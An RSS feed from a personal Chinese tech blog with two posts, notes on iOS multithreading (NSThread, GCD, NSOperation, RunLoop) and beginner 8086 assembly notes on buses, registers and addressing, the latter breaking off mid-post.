<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Yasin Blog</title>
    <description>不知道写些什么...</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Fri, 11 Aug 2017 02:12:17 +0000</pubDate>
    <lastBuildDate>Fri, 11 Aug 2017 02:12:17 +0000</lastBuildDate>
    <generator>Jekyll v3.3.1</generator>
    
      <item>
        <title>iOS下的多线程</title>
        <description>&lt;h3 id=&quot;基本方法&quot;&gt;基本方法&lt;/h3&gt;

&lt;p&gt;获取主线程&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[NSThread mainThread]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;获取当前线程&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[NSThread currentThread]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;nsthread的使用&quot;&gt;NSThread的使用&lt;/h3&gt;

&lt;p&gt;基础用法，需要手动启动线程，可以对线程进行一些设置（线程名，优先级）&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    NSThread *thread = [[NSThread alloc]initWithTarget:self selector:@selector(run:) object:@&quot;test1&quot;];
    thread.name = @&quot;mythread1&quot;;
    [thread start];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;类方法快速启动线程,不需要手动开启，不能对线程进行设置&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    [NSThread detachNewThreadSelector:@selector(run:) toTarget:self withObject:@&quot;test2&quot;];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;开启一个后台线程，不能对线程进行设置&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    [self performSelectorInBackground:@selector(run:) withObject:@&quot;test3&quot;];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;###线程状态&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;执行的步骤&lt;/th&gt;
      &lt;th&gt;线程状态&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;alloc&lt;/td&gt;
      &lt;td&gt;创建线程对象&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;start&lt;/td&gt;
      &lt;td&gt;放入线程池(就绪，等待CPU调度)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;CPU调度&lt;/td&gt;
      &lt;td&gt;运行&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;CPU调度其它线程&lt;/td&gt;
      &lt;td&gt;回到就绪状态&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;CPU调度&lt;/td&gt;
      &lt;td&gt;运行&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;执行完毕&lt;/td&gt;
      &lt;td&gt;线程退出&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;线程阻塞休眠&quot;&gt;线程阻塞(休眠)&lt;/h4&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sleep/等待同步锁&lt;/code&gt;会线程阻塞，线程从线程池中移除，当阻塞结束重新进入线程池等待CPU调度&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    [NSThread sleepForTimeInterval:2];//休眠2秒
    
    [NSThread sleepUntilDate:[NSDate dateWithTimeIntervalSinceNow:2]];//休眠到指定的时间
    //这里的NSDate可以设置[NSDate distantFuture]时间为极大值，这样能实现只执行一次
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;线程死亡&quot;&gt;线程死亡&lt;/h4&gt;
&lt;p&gt;1.线程任务执行完成
2.异常/强制退出
一旦线程死亡，就不能再开启任务。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    [NSThread exit]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;互斥锁同步锁&quot;&gt;互斥锁(同步锁)&lt;/h4&gt;

&lt;p&gt;优点:能有效防止多线程抢夺资源造成数据错乱。
缺点:会产生线程等待，消耗大量的CPU资源。&lt;/p&gt;

&lt;p&gt;线程同步是多条线程在同一条线上按顺序执行。
通过@synchronized可以使代码获得原子性，同时只能在一条线程上执行，保证了多线程的安全。&lt;a href=&quot;http://www.cocoachina.com/ios/20161205/18279.html&quot;&gt;这里有比较详细的介绍。&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    //token是锁对象，唯一的，会生成同步锁，当一条线程执行完后，才执行下一条线程
    @synchronized (token) {数据操作代码}

    //这里传入一个唯一的对象，用来做锁对象,多个线程同时调用这段代码，会一个线程一个线程的执行，所以count的值不会混乱
    @synchronized (self) {
        self.count++;
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;回主线程&quot;&gt;回主线程&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    [self performSelectorOnMainThread:@selector(changeUI) withObject:nil waitUntilDone:YES];
    //UntilDone表示执行完changeUI方法在执行下面的语句,即同步还是异步
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;gcd&quot;&gt;GCD&lt;/h3&gt;

&lt;h4 id=&quot;获得并行队列concurrent&quot;&gt;获得并行队列concurrent&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    //获取全局的的并发队列 参数1是队列的优先级，参数2没用传0
    dispatch_get_global_queue(long identifier, unsigned long flags)
    
    //创建队列 参数1是队列名，参数2是队列属性，判断是并行还是串行队列,DISPATCH_QUEUE_CONCURRENT表示并行队列
    dispatch_queue_create(const char * _Nullable label, dispatch_queue_attr_t  _Nullable attr)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;获得串行队列serial&quot;&gt;获得串行队列serial&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    dispatch_get_main_queue()//获得主队列
    
    //参数2传入DISPATCH_QUEUE_SERIAL或NULL表示串行队列
    dispatch_queue_create(const char * _Nullable label, dispatch_queue_attr_t  _Nullable attr)

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;同步任务sync&quot;&gt;同步任务sync&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    dispatch_sync(queue, ^{
        for(int i= 0;i&amp;lt;5;i++){
            NSLog(@&quot;--2--%@&quot;,[NSThread currentThread]);
        }
    });
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;异步任务async&quot;&gt;异步任务async&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    dispatch_async(queue, ^{
        for(int i= 0;i&amp;lt;5;i++){
            NSLog(@&quot;--1--%@&quot;,[NSThread currentThread]);
        }
    });
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;队列类型:决定了任务执行是顺序还是并发
任务类型:决定了是否开启新线程（主队列异步任务不会开启新线程）&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;子线程回主线程&quot;&gt;子线程回主线程&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        //耗时操作
        dispatch_async(dispatch_get_main_queue(), ^{
            //主线程ui操作
        });
    });
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;延时&quot;&gt;延时&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        //2秒后异步执行这里的代码
    });
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;一次性代码&quot;&gt;一次性代码&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    static dispatch_once_t onceToken;
    dispatch_once(&amp;amp;onceToken, ^{
        //只执行1次的代码
    });
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;遍历&quot;&gt;遍历&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    //参数1表示遍历次数。遍历是并发的。
    dispatch_apply(10, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(size_t index) {
        //index当前遍历的下标
        NSLog(@&quot;%d&quot;,index);
    });
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;队列组&quot;&gt;队列组&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    //1.创建队列组
    dispatch_group_t group = dispatch_group_create();
    
    //2.添加任务
    dispatch_group_async(group, dispatch_get_global_queue(0, 0), ^{
        //任务1
    });
    dispatch_group_async(group, dispatch_get_global_queue(0, 0), ^{
        //任务2
    });
    
    //3.设置任务完后回调
    dispatch_group_notify(group, dispatch_get_main_queue(), ^{
        //任务1和任务2执行完成后，回到执行的线程执行这里的代码
    });
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;nsoperation和nsoperationqueue&quot;&gt;NSOperation和NSOperationQueue&lt;/h3&gt;

&lt;p&gt;NSOperation是基于GCD实现的。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;实现多线程的步骤
1.先将任务封装到NSOperation对象中。
2.把NSOperation添加到NSOperationQueue中。
3.系统自动从NSOperationQueue中提取NSOperation。
4.将提取出的NSOperation封装的任务放到一条线程中去执行。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;nsoperation&quot;&gt;NSOperation&lt;/h4&gt;

&lt;p&gt;NSOperation是一个抽象类，不具备封装任务的能力，必须使用它的子类。&lt;code class=&quot;highlighter-rouge&quot;&gt;NSInvocationOperation&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;NSBlockOperation&lt;/code&gt;或者自定义子类继承&lt;code class=&quot;highlighter-rouge&quot;&gt;NSOperation&lt;/code&gt;。&lt;/p&gt;

&lt;h4 id=&quot;nsinvocationoperation的使用&quot;&gt;NSInvocationOperation的使用&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    NSInvocationOperation *ip = [[NSInvocationOperation alloc]initWithTarget:self selector:@selector(run) object:nil];
    
    //开启任务
    [ip start];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;nsblockoperation的使用&quot;&gt;NSBlockOperation的使用&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    NSBlockOperation *bp = [NSBlockOperation blockOperationWithBlock:^{
        NSLog(@&quot;--2--%@&quot;,[NSThread currentThread]);
    }];
    
    //可以添加额外任务，在子线程中完成
    [bp addExecutionBlock:^{
        NSLog(@&quot;other--%@&quot;,[NSThread currentThread]);
    }];
    
    [bp start];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;自定义operation的使用&quot;&gt;自定义Operation的使用&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.创建CustomOperation继承于NSOperation。
2.添加一个属性存放要执行的代码，可以用block，用于外部传入代码。
3.重写main方法，在main方法里面执行步骤2传入的代码。
4.调用CustomOperation的start方法会自动调用main方法。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;nsoperationqueue的基本使用&quot;&gt;NSOperationQueue的基本使用&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    //创建队列(默认是并行队列)
    NSOperationQueue *queue = [[NSOperationQueue alloc]init];
    
    //创建任务
    NSInvocationOperation *op = [[NSInvocationOperation alloc]initWithTarget:self selector:@selector(run) object:nil];
    
    //添加任务
    [queue addOperation:op];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;nsoperation线程通信&quot;&gt;NSOperation线程通信&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    NSOperationQueue *queue = [[NSOperationQueue alloc]init];
    
    [queue addOperationWithBlock:^{
        //耗时操作
        [[NSOperationQueue mainQueue] addOperationWithBlock:^{
            //回到主线程刷新UI
        }];
    }];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;dependency任务依赖&quot;&gt;Dependency任务依赖&lt;/h4&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;NSOperation&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;addDependency&lt;/code&gt;方法添加依赖，如果A依赖B，等B执行完后，再执行A&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    NSOperationQueue *queue = [[NSOperationQueue alloc]init];
    
    NSBlockOperation *bp = [NSBlockOperation blockOperationWithBlock:^{
        NSLog(@&quot;--1--%@&quot;,[NSThread currentThread]);
    }];
    
    NSBlockOperation *bp1 = [NSBlockOperation blockOperationWithBlock:^{
        NSLog(@&quot;--2--%@&quot;,[NSThread currentThread]);
    }];
    
    //后面的先执行 不能相互依赖
    [bp1 addDependency:bp];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;maxconcurrentoperationcount最大并发数&quot;&gt;maxConcurrentOperationCount最大并发数&lt;/h4&gt;

&lt;p&gt;通过&lt;code class=&quot;highlighter-rouge&quot;&gt;NSOperationQueue&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;maxConcurrentOperationCount&lt;/code&gt;属性可以设置最大并发数。默认为-1，不限制并发的数量。设置为1是，队列为串行队列。&lt;/p&gt;

&lt;h4 id=&quot;suspended队列的挂起和取消&quot;&gt;suspended队列的挂起和取消&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;将队列挂起可以暂停队列里面任务的执行。&lt;/li&gt;
  &lt;li&gt;通过&lt;code class=&quot;highlighter-rouge&quot;&gt;NSOperationQueue&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;suspended&lt;/code&gt;属性控制是否挂起，为YES是挂起。&lt;/li&gt;
  &lt;li&gt;当任务处于执行状态，设置挂起还是会继续执行，受影响的是那些还没有执行的任务。&lt;/li&gt;
  &lt;li&gt;当队列设置为挂起状态后，可以通过修改其状态再次恢复任务。&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;cancelalloperations取消&quot;&gt;cancelAllOperations取消&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;通过&lt;code class=&quot;highlighter-rouge&quot;&gt;NSOperationQueue&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;cancelAllOperations&lt;/code&gt;方法来取消任务。&lt;/li&gt;
  &lt;li&gt;取消任务后不可恢复。&lt;/li&gt;
  &lt;li&gt;若任务是自定义NSOperation类型的话，执行完一个耗时操作后，需加一个是否取消任务的判断，再去执行另外一个耗时操作。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;runloop&quot;&gt;RunLoop&lt;/h3&gt;

&lt;p&gt;内部由do-while循环实现的&lt;/p&gt;

&lt;p&gt;作用：&lt;/p&gt;

&lt;p&gt;1.保证程序的持续运行。&lt;/p&gt;

&lt;p&gt;2.处理APP的各种事件。&lt;/p&gt;

&lt;p&gt;3.节省CPU资源，提高程序性能。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    int main(int argc,char * argv[]){
    	do{
        	NSLog(@&quot;haha&quot;);//程序开始
        }while(1);
        return 0;//程序结束
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;runloop其实就是一个死循环，保持程序运行&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    int main(int argc, char * argv[]) {
        @autoreleasepool {
            return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
        }
    }

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;UIApplicationMain函数内部就启动了一个RunLoop，一直不返回程序就持续运行。
程序启动会默认启动一个RunLoop，跟主线程相关联，主要处理与主线程相关的事件。&lt;/p&gt;

&lt;h4 id=&quot;runloop对象&quot;&gt;RunLoop对象&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;NSRunLoop&lt;/li&gt;
  &lt;li&gt;CFRunLoopRef&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;runloop与线程&quot;&gt;RunLoop与线程&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;每条线程都有唯一的一个与之对应的RunLoop对象。&lt;/li&gt;
  &lt;li&gt;子线程的RunLoop需要手动创建&lt;/li&gt;
  &lt;li&gt;获得主线程RunLoop的方法[NSRunLoop mainRunLoop];&lt;/li&gt;
  &lt;li&gt;创建子线程RunLoop的方法是[NSRunLoop currentRunLoop];&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;runloop相关类&quot;&gt;RunLoop相关类&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;CFRunLoopModeRef&lt;/li&gt;
  &lt;li&gt;CFRunLoopSourceRef&lt;/li&gt;
  &lt;li&gt;CFRunLoopTimerRef&lt;/li&gt;
  &lt;li&gt;CFRunLoopObserverRef&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;cfrunloopmoderef&quot;&gt;CFRunLoopModeRef&lt;/h4&gt;
&lt;p&gt;1.CFRunLoopModeRef是RunLoop的运行模式。&lt;/p&gt;

&lt;p&gt;2.一个Runloop可以包含若干个Mode，每个Mode包含若干个Source/Timer/Observer。&lt;/p&gt;

&lt;p&gt;3.每次RunLoop启动时，只能指定其中的一个Mode，这个Mode被称为currentMode。&lt;/p&gt;

&lt;p&gt;4.如果需要切换Mode，需要退出RunLoop，在重新指定一个Mode进入。这样是为了分离不同组的Source/Timer/Observer，让它们互不影响。&lt;/p&gt;

&lt;p&gt;系统默认注册了5个Mode&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. NSDefaultRunLoopMode: App的默认 Mode，通常主线程是在这个 Mode 下运行的。

2. UITrackingRunLoopMode: 界面跟踪 Mode，用于 ScrollView 追踪触摸滑动，保证界面滑动时不受其他 Mode 影响。

3. UIInitializationRunLoopMode: 在刚启动 App 时第进入的第一个 Mode，启动完成后就不再使用。

4: GSEventReceiveRunLoopMode: 接受系统事件的内部 Mode，通常用不到。

5: NSRunLoopCommonModes: 这是一个占位的 Mode，代表了NSDefaultRunLoopMode和UITrackingRunLoopMode。

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;NSRunLoopCommonModes只是一个标记，NSDefaultRunLoopMode和UITrackingRunLoopMode都拥有这个标记。
设置为NSRunLoopCommonModes可以在NSDefaultRunLoopMode和UITrackingRunLoopMode模式下都执行。&lt;/p&gt;

&lt;h4 id=&quot;cfrunlooptimerref&quot;&gt;CFRunLoopTimerRef&lt;/h4&gt;

&lt;p&gt;这个类是基于时间的触发器&lt;/p&gt;

&lt;h4 id=&quot;cfrunloopsourceref&quot;&gt;CFRunLoopSourceRef&lt;/h4&gt;

&lt;p&gt;这个类是一个事件源，也可以称为输入源。&lt;/p&gt;

&lt;p&gt;官方文档分为3类
1.Port-Based Sources从其他线程或内核发出的
2.Custom Input Sources自定义的
3.CoCoa Perform Selector Sources&lt;/p&gt;

&lt;p&gt;函数调用栈分为2类
1.Sources0:非基于Port的（按钮点击）
2.Sources1:基于Port的，通过其他线程或内核通信、接受、分发系统事件。&lt;/p&gt;

&lt;h4 id=&quot;cfrunloopobserverref&quot;&gt;CFRunLoopObserverRef&lt;/h4&gt;

&lt;p&gt;CFRunLoopObserverRef是观察者，能够监听RunLoop的状态的改变。状态是&lt;code class=&quot;highlighter-rouge&quot;&gt;CFRunLoopActivity&lt;/code&gt;这个枚举。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    //创建观察者
    CFRunLoopObserverRef observer = CFRunLoopObserverCreateWithHandler(CFAllocatorGetDefault(), kCFRunLoopAllActivities, YES, 0, ^(CFRunLoopObserverRef observer, CFRunLoopActivity activity) {
        NSLog(@&quot;%lu&quot;,activity);//打印RunLoop的状态
    });
    //添加观察者
    CFRunLoopAddObserver(CFRunLoopGetCurrent(), observer, kCFRunLoopDefaultMode);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Tue, 08 Aug 2017 12:00:00 +0000</pubDate>
        <link>http://localhost:4000/2017/08/08/iOS%E5%A4%9A%E7%BA%BF%E7%A8%8B/</link>
        <guid isPermaLink="true">http://localhost:4000/2017/08/08/iOS%E5%A4%9A%E7%BA%BF%E7%A8%8B/</guid>
        
        <category>iOS</category>
        
        
      </item>
    
      <item>
        <title>汇编学习笔记</title>
        <description>&lt;p&gt;前段时间搞微信余额修改遇到瓶颈，想着还是学学汇编吧，工作之余看了几个月的书，收获还是不少，把重点记录在此，方便查阅。看的书是王爽老师的&lt;a href=&quot;https://item.jd.com/11314390.html&quot;&gt;《汇编语言》&lt;/a&gt;，写的真是非常的清晰易懂，推荐想学汇编的先看这本书。&lt;/p&gt;

&lt;h1 id=&quot;基础知识&quot;&gt;基础知识&lt;/h1&gt;

&lt;h3 id=&quot;汇编指令&quot;&gt;汇编指令&lt;/h3&gt;

&lt;p&gt;首先汇编是不区分大小写的。
汇编有3类指令&lt;/p&gt;

&lt;p&gt;1.汇编指令：和机器码一一对应&lt;/p&gt;

&lt;p&gt;2.伪指令：没有对应的机器码，由编译器执行，计算机不执行，有点像define&lt;/p&gt;

&lt;p&gt;3.其他符号：如&lt;code class=&quot;highlighter-rouge&quot;&gt;+、-、*、/&lt;/code&gt;等，由编译器识别，没有对应的机器码&lt;/p&gt;

&lt;h3 id=&quot;存储器&quot;&gt;存储器&lt;/h3&gt;

&lt;p&gt;存储器被划分成若干个存储单元，每个存储单元从0开始编号，例如一个存储器有128个存储单元，编号从0~127。
每个存储单元能放一个&lt;code class=&quot;highlighter-rouge&quot;&gt;Byte(字节)&lt;/code&gt;，&lt;code class=&quot;highlighter-rouge&quot;&gt;1Byte=8bit&lt;/code&gt;。也就是说每个存储单元是8位的。&lt;/p&gt;

&lt;h3 id=&quot;cpu数据读写&quot;&gt;CPU数据读写&lt;/h3&gt;

&lt;p&gt;cpu对存储器的读写需要3个信息交互&lt;/p&gt;

&lt;p&gt;1.存储单元的地址（地址信息）&lt;/p&gt;

&lt;p&gt;2.器件的选择、读或写的命令（控制信息）&lt;/p&gt;

&lt;p&gt;3.读或写的数据（数据信息）&lt;/p&gt;

&lt;p&gt;用生活中的例子来表示就像快递，首先要知道快递网点的地址，然后要知道你是取还是寄包裹，最后要把包裹带上。
信息信号物理上是通过&lt;code class=&quot;highlighter-rouge&quot;&gt;总线&lt;/code&gt;来传输的，逻辑上又分为了&lt;code class=&quot;highlighter-rouge&quot;&gt;地址总线&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;控制总线&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;数据总线&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;要让CPU进行数据读写，只要输入驱动它工作的电平信息（机器码）就行了。&lt;/p&gt;

&lt;p&gt;CPU通过地址总线来指定存储单元，CPU有N根地址线就能寻找2的N次方个内存单元。（用2进制传输一个数字，表示取第几个单元）。&lt;/p&gt;

&lt;p&gt;CPU通过数据总线来进行数据传输，数据总线的宽度决定了CPU和外接的数据传输速度。一根线一次传输一个bit。8086CPU总线宽度为16，一次能传输2个字节的数据。&lt;/p&gt;

&lt;p&gt;CPU通过控制总线来对外部器件进行控制，控制总线是一些不同控制线的集合。控制总线的数量决定了CPU对外部器件有多少种控制。对于内存读取来说，有一根&lt;code class=&quot;highlighter-rouge&quot;&gt;“读信号输出”&lt;/code&gt;的控制线复制CPU向外传送读信号。当CPU向控制线输出低电平表示读取数据；还有一根&lt;code class=&quot;highlighter-rouge&quot;&gt;“写信号输出”&lt;/code&gt;的控制线负责传送写信号。&lt;/p&gt;

&lt;p&gt;总的来说&lt;/p&gt;

&lt;p&gt;1.地址总线的宽度决定了CPU的寻找能力。&lt;/p&gt;

&lt;p&gt;2.数据总线的宽度决定了CPU与其他器件进行数据传送时的单次数据量，进而决定了传送次数。&lt;/p&gt;

&lt;p&gt;3.控制总线的宽度决定了CPU对系统中其他器件的控制能力。&lt;/p&gt;

&lt;h1 id=&quot;寄存器&quot;&gt;寄存器&lt;/h1&gt;

&lt;p&gt;CPU由运算器、控制器、寄存器等器件构成，这些器件通过内部总线相连。&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;运算器进行信息处理；&lt;/li&gt;
  &lt;li&gt;寄存器进行信息存储；&lt;/li&gt;
  &lt;li&gt;控制器控制各种器件进行工作；&lt;/li&gt;
  &lt;li&gt;内部总线连接各种器件，在器件之间进行数据的传送；&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;汇编其实就是操作寄存器，程序员通过指令读写寄存器来实现对CPU的控制。不同的CPU寄存器的个数、结构是不同的。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;8086的14个寄存器分别为AX、BX、CX、DX、SI、DI、SP、BP、IP、CS、SS、DS、ES、PSW。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;8086的所有寄存器都是16位的。AX、BX、CX、DX、这4个通常用来存放一般性的数据，被称为通用寄存器。为了兼容老CPU的8位寄存器，这4个寄存器都可以分为两个8位的独立寄存器使用。&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;AX分为AH和AL&lt;/li&gt;
  &lt;li&gt;BX分为BH和BL&lt;/li&gt;
  &lt;li&gt;CX分为CH和CL&lt;/li&gt;
  &lt;li&gt;DX分为DH和DL&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;8086可以一次性处理以下两种尺寸的数据&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;字节：记为byte，一个字节由8个bit组成，可以存放在8位寄存器中。&lt;/li&gt;
  &lt;li&gt;字：记为Word，一个字有两个字节组成，这两个字节分别称为这个字的高位字节和低位字节。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;一个内存单元可存放8位数据，CPU寄存器可存放n个8位的数据，也就是说，计算机中的数据大多是有1~N个8位数据构成。为了直观显示，一般用16进制来显示。比如20000写成4E20就能直观的看出，这个数据是由4E和20这两个8位数据构成。&lt;/p&gt;

&lt;h1 id=&quot;内存地址&quot;&gt;内存地址&lt;/h1&gt;

&lt;p&gt;CPU访问内存单元时，需要给出内存单元的地址，所有的内存单元构成的存储空间是一个一维的线性空间，每个内存单元在这个空间中都有唯一的地址，我们将这个唯一的地址称为物理地址。&lt;/p&gt;

&lt;p&gt;CPU通过地址总线送入存储器的是一个内存单元的物理地址，这个物理地址是在CPU内部形成的，不同的CPU可以有不同的形成方式。&lt;/p&gt;

&lt;p&gt;8086形成物理地址的方法
8086CPU用一个20位的地址总线，寻址能力1MB。但是又是16位的结构，内部存储、传输、暂时存储的地址为16位。这样如果只是直接发出，那么只能送出16位的地址，寻址能力就只有64KB。比较浪费资源。
